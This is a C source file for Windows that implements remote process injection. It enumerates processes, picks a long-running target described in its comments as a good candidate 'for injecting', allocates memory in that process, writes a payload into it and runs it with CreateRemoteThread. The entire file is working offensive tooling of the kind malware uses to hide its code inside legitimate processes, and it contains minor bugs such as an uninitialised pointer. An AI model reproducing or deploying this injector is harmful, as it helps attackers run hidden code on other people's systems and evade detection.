#include "PI.h"

t_list_infos	*getProcessesList() {
	int ownPid = _getpid();



	size_t lpidProcessSize = 1024;
	DWORD *lpidProcesses = (DWORD*)malloc(sizeof(DWORD) * lpidProcessSize);
	DWORD processesReturned;

	if (!EnumProcesses(lpidProcesses, sizeof(DWORD) * 1024, &processesReturned)) {
		printf("Couldn't fetch processes running on the machine, Error code %lx\n", GetLastError());
		free(lpidProcesses);
		return NULL;
	}

	int jumper = -1;
	int usefullProcesses = 0;
	t_list_infos *listInfos = (t_list_infos*)malloc(sizeof(t_list_infos));
	t_pinfo *processInfo;
	listInfos->head = NULL;
	listInfos->tail = NULL;
	listInfos->choosenProcess;
	while (++jumper < processesReturned / sizeof(DWORD)) {
		// better safe than sorry :)
		if (lpidProcesses[jumper] && lpidProcesses[jumper] != ownPid) {
			HANDLE HProcess;

			if (!(HProcess = OpenProcess(
					PROCESS_CREATE_THREAD|
					PROCESS_VM_WRITE|
					PROCESS_VM_OPERATION|
					PROCESS_QUERY_INFORMATION,
					FALSE,
					lpidProcesses[jumper]
				)))
				continue;
			processInfo = (t_pinfo*)malloc(sizeof(t_pinfo));

			// timings to use a process that was up for a long time, that might be a good condidat for injecting, cause it might stay up for a long moment.
			if(!(GetProcessTimes(
					HProcess,
					&(processInfo->PCreationTime),
					&(processInfo->PExitTime),
					&(processInfo->PKernelTime),
					&(processInfo->PUserTime)
				))) {
				free(processInfo);
				printf("Couldn't get process %d times, Error: %lx", lpidProcesses[jumper], GetLastError());
				continue;
			}
			processInfo->pid = lpidProcesses[jumper];
			processInfo->HProcess = HProcess;
			processInfo->next = NULL;
			memset(&(processInfo->time64), 0, 8);
			processInfo->time64 = processInfo->PCreationTime.dwHighDateTime;
			processInfo->time64 = processInfo->time64 << 32 | processInfo->PCreationTime.dwLowDateTime;

			if (!(listInfos->choosenProcess) || listInfos->choosenProcess->time64 > processInfo->time64) {
				listInfos->choosenProcess = processInfo;
			}

			if (!listInfos->head && !listInfos->tail) {
				listInfos->head = processInfo;
				listInfos->tail = processInfo;
			}
			listInfos->tail->next = processInfo;
			listInfos->tail = processInfo;

		}
	}

	return listInfos;
}

int		allocateVirtualMemory(size_t size, DWORD allocationType, DWORD protectionType ,t_pinfo *process) {
	process->VMPointer = NULL;

	if (!(process->VMPointer = VirtualAllocEx(
			process->HProcess,
			NULL,
			size,
			allocationType,
			protectionType
		))) {
		printf("Couldn't reserve/alloc memory in process virtualAddress, Error code %lx\n", GetLastError());
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;

}


int		populateProcessMemory(void *payload, size_t payloadSize, t_pinfo *process) {
	process->dataWritten = 0;
	process->wasDelivered = FALSE;
	if (!(process->wasDelivered = WriteProcessMemory(
			process->HProcess,
			process->VMPointer,
			payload,
			payloadSize,
			&(process->dataWritten)
		))) {
		printf("Couldn't deliver the playload, Error code %lx\n", GetLastError());
		// need to brut-force !
		return EXIT_FAILURE;
	}

	if (process->dataWritten != payloadSize) {
		// still not sure if i should choose another process or not ! depend on the upcoming implementation and if that's occure often.
		printf("Payload wasn't written in its entirety, payloadSize: %ud, dataWritten: %ud\n", payloadSize, process->dataWritten);
	}

	return EXIT_SUCCESS;
}


int		summonExecuterThread(LPSECURITY_ATTRIBUTES securityAttr, SIZE_T stackSize, void *threadParam, DWORD creationFlags, t_pinfo *process) {
	process->HThread = NULL;
	process->threadId;

	if (!(process->HThread = CreateRemoteThread(
			process->HProcess,
			securityAttr,
			stackSize,
			(LPTHREAD_START_ROUTINE)process->VMPointer,
			threadParam,
			creationFlags,
			&(process->threadId)
		))) {
		printf("Couldn't summon a thread. to execute the payload, %lx\n", GetLastError());
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}